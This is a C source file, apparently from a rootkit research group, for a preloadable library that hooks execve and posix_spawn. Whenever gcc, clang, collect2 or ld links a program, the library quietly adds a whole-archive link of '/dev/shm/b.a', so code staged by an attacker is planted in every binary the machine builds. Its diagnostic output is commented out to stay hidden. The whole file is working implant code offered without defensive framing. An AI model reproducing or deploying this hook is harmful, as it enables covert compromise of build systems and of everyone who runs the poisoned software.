/*

X: @MatheuzSecurity
Rootkit Researchers
https://discord.gg/66N5ZQppU7

*/


#define _GNU_SOURCE
#include <dlfcn.h>
#include <spawn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

extern char **environ;

int is_gcc(const char *path) {
    const char *progname = strrchr(path, '/');
    progname = progname ? progname + 1 : path;
    return strcmp(progname, "gcc") == 0 || strcmp(progname, "cc") == 0 || strcmp(progname, "clang") == 0;
}

int is_collect2(const char *path) {
    const char *progname = strrchr(path, '/');
    progname = progname ? progname + 1 : path;
    return strcmp(progname, "collect2") == 0;
}

int is_linker(const char *path) {
    const char *progname = strrchr(path, '/');
    progname = progname ? progname + 1 : path;
    return strcmp(progname, "ld") == 0 || strstr(progname, "ld.") != NULL;
}

int should_inject(char *const argv[]) {
    for (int i = 0; argv[i]; ++i) {
        if (strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "-E") == 0 || strcmp(argv[i], "-S") == 0)
            return 0;
    }
    return 1;
}

char **inject_args(const char *bin_path, char *const argv[], int extra) {
    int argc;
    for (argc = 0; argv[argc]; ++argc);

    const char *lib_path = "/dev/shm/b.a";

    for (int i = 0; i < argc; ++i) {
        if (argv[i] && strstr(argv[i], "b.a") != NULL) {
            return NULL;
        }
    }

    const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1));
    if (!new_argv) return NULL;

    int i = 0, j = 0;
    for (; i < argc; ++i)
        new_argv[j++] = argv[i];

    const char *arg1, *arg2, *arg3;
    if (is_gcc(bin_path)) {
        arg1 = "-Wl,--whole-archive";
        arg2 = lib_path;
        arg3 = "-Wl,--no-whole-archive";
    } else {
        arg1 = "--whole-archive";
        arg2 = lib_path;
        arg3 = "--no-whole-archive";
    }

    new_argv[j++] = arg1;
    new_argv[j++] = arg2;
    new_argv[j++] = arg3;
    new_argv[j] = NULL;

    return (char **)new_argv;
}

int execve(const char *pathname, char *const argv[], char *const envp[]) {
    static int (*real_execve)(const char *, char *const [], char *const []) = NULL;
    if (!real_execve) real_execve = dlsym(RTLD_NEXT, "execve");

    if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) && should_inject(argv)) {
        //fprintf(stderr, "[hook execve] injecting into %s\n", pathname);

        char **new_argv = inject_args(pathname, argv, 3);
        if (new_argv) {
            int result = real_execve(pathname, new_argv, envp);
            free(new_argv);
            return result;
        }
    }

    return real_execve(pathname, argv, envp);
}

int posix_spawn(pid_t *pid, const char *path,
                const posix_spawn_file_actions_t *file_actions,
                const posix_spawnattr_t *attrp,
                char *const argv[], char *const envp[]) {
    static int (*real_posix_spawn)(pid_t *, const char *,
                                   const posix_spawn_file_actions_t *,
                                   const posix_spawnattr_t *,
                                   char *const [], char *const []) = NULL;
    if (!real_posix_spawn)
        real_posix_spawn = dlsym(RTLD_NEXT, "posix_spawn");

    if ((is_gcc(path) || is_collect2(path) || is_linker(path)) && should_inject(argv)) {
        //fprintf(stderr, "[HOOKED] %s\n", path);

        char **new_argv = inject_args(path, argv, 3);
        if (new_argv) {
            int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp);
            free(new_argv);
            return result;
        }
    }

    return real_posix_spawn(pid, path, file_actions, attrp, argv, envp);
}
